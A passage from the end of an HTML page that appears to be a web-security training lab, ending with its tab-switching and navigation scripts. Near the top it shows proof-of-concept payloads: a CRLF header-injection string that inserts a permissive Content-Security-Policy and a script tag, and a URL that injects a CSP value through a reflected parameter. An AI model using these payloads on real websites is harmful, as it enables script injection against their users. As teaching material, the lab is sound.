%0d%0aContent-Security-Policy:%20script-src%20*%0d%0a%0d%0a&lt;script&gt;alert(1)&lt;/script&gt;
                    </div>
                    <div class="payload-box">
                        <span class="payload-label">Policy Injection via Reflected Header</span>
https://vulnerable.com/page?csp=script-src%20*
&lt;!-- If CSP value reflected from URL parameter --&gt;
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-markup.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
    <script>
        // Lab navigation
        document.querySelectorAll('.lab-item').forEach(item => {
            item.addEventListener('click', function() {
                document.querySelectorAll('.lab-item').forEach(i => i.classList.remove('active'));
                this.classList.add('active');

                const labId = this.dataset.lab;
                document.querySelectorAll('.lab-content').forEach(content => {
                    content.classList.add('hidden');
                });
                document.getElementById(labId).classList.remove('hidden');
            });
        });

        // Code tab switching
        document.querySelectorAll('.code-tab').forEach(tab => {
            tab.addEventListener('click', function() {
                const lab = this.dataset.lab;
                const view = this.dataset.view;

                document.querySelectorAll(`.code-tab[data-lab="${lab}"]`).forEach(t => {
                    t.classList.remove('active');
                });
                this.classList.add('active');

                document.getElementById(`${lab}-vulnerable`).classList.toggle('hidden', view !== 'vulnerable');
                document.getElementById(`${lab}-secure`).classList.toggle('hidden', view !== 'secure');
            });
        });
    </script>
</body>
</html>
